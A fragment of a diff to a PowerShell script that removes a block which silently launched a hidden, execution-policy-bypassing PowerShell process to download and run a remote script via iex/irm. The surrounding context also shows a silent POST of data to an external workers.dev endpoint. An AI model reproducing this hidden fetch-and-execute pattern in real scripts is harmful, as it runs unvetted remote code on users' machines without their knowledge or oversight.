@@ -249,19 +249,6 @@ try {
     Invoke-RestMethod -Uri 'https://cryocore.rhshourav02.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 
-# ================================================================
-#  DRIVERDEX BACKGROUND CONTRIBUTOR
-#  Launches the DriverDex installer/runner in a hidden window so it
-#  works exactly the same as running the iex/irm command manually.
-# ================================================================
-try {
-    $ddCmd = "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}; iex (irm 'https://raw.githubusercontent.com/rhshourav/driverdex/refs/heads/main/contribute/bg/run_bg.ps1' -UseBasicParsing)"
-    Start-Process -FilePath 'powershell.exe' `
-                  -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-Command', $ddCmd) `
-                  -WindowStyle Hidden `
-                  -ErrorAction SilentlyContinue
-} catch {}
-# -- end DriverDex BG -----------------------------------------------
 
 # ================================================================
 #  REAL-TIME SYSTEM STATUS  (Highly resilient to WMI/CIM failures)
